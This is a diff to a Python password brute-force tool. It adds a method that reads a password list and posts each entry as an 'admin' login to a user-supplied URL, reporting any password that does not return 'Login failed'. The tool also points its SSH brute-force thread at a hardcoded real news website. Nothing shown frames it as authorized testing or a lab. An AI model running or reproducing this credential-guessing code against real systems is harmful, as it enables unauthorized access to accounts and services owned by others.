@@ -1,7 +1,9 @@
 import paramiko, sys, os, socket
 import threading, time
+from pyparsing import Word
 from rich.console import Console
 from art import *
+import requests
 
 console=Console()
 stop_flag=0
@@ -30,6 +32,7 @@ class brute_force:
         bf.passwords_bulk = "./Brute Force/passwords.txt"
         bf.single_password = ""
         bf.code = 0
+        
 
     @staticmethod
     def entry_message():
@@ -99,12 +102,24 @@ class brute_force:
                 #print("thread = ", t)
                 time.sleep(0.5)
         
+    def post(bf):
+        print("Please enter target")
+        bf.target = input()
+        data_dict ={"username" : "admin", "password":"password"}
+        with open(bf.passwords_bulk, 'r') as file:
+            for line in file.readlines():
+                bf.single_password = line.strip()
+                data_to_send = {"username" : "admin" , "password" : bf.single_password}
+                response = requests.post(bf.target,data=data_to_send)
+                if "Login failed" not in response.text:
+                    print("[+] Password found --->" + bf.single_password)
     def init_main(bf):
         '''
         Here we init the function to run, we run the functions in order to the request of the user
         '''
         bf.entry_message()
-        bf.username = "test"
+        bf.post()
+        bf.username = "admin"
         bf.target = "http://www.ynet.co.il"
         bf.ssh_thread()
 
